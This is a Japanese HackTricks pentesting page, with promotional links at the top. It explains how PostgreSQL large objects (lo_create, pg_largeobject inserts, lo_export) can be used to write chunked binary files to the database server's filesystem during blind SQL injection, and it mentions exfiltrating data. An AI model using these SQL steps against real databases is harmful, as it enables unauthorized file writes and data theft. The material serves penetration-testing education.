<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦で**フォロー**する：[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubリポジトリに提出してください。**

</details>

### PostgreSQL Large Objects

PostgreSQLは、画像やPDFドキュメントなどの大規模なデータ型を保存するために設計された`pg_largeobject`テーブルを介してアクセス可能な**大規模オブジェクト**として知られる構造を提供しています。このアプローチは、`COPY TO`関数よりも優れており、データをファイルシステムに**エクスポート**することで、元のファイルの正確なレプリカが維持されます。

このテーブルに**完全なファイルを保存**するためには、`pg_largeobject`テーブルにオブジェクト（LOIDで識別される）を作成し、このオブジェクトに2KBごとのデータチャンクを挿入する必要があります。これらのチャンクが正確に2KBのサイズであること（最後のチャンクを除く可能性がある）は、エクスポート機能が正しく機能するために重要です。

バイナリデータを**2KBのチャンクに分割**するために、次のコマンドを実行できます：
```bash
split -b 2048 your_file # Creates 2KB sized files
```
各ファイルをBase64またはHexにエンコードするために、以下のコマンドを使用できます：
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**重要**: このプロセスを自動化する際は、2KBのクリアテキストバイトのチャンクを送信することを確認してください。 ヘックスエンコードされたファイルはサイズが倍になるため、1チャンクあたり4KBのデータが必要です。一方、Base64エンコードされたファイルは、`ceil(n / 3) * 4`の式に従います。

大きなオブジェクトの内容は、デバッグ目的で表示できます。
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### `lo_creat`とBase64を使用する

バイナリデータを保存するために、まずLOIDが作成されます：
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
状況に応じて正確な制御が必要な場合、Blind SQL Injectionを悪用する際には、固定のLOIDを指定するために`lo_create`が好まれます。

その後、データチャンクを以下のように挿入できます：
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
大きなオブジェクトをエクスポートして、使用後に削除するには:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### `lo_import`とHexの使用

`lo_import`関数を使用して、大きなオブジェクトのためのLOIDを作成および指定することができます：
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
以下のオブジェクト作成後、各ページごとにデータが挿入され、各チャンクが2KBを超えないようにします。
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
プロセスを完了するために、データがエクスポートされ、大きなオブジェクトが削除されます：
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### 制限事項

**大きなオブジェクトにはACL（アクセス制御リスト）がある可能性**があり、それによりユーザーが作成したオブジェクトへのアクセスが制限されることがあります。ただし、許可の大きなACLを持つ古いオブジェクトは、コンテンツの外部流出に対してまだアクセス可能かもしれません。
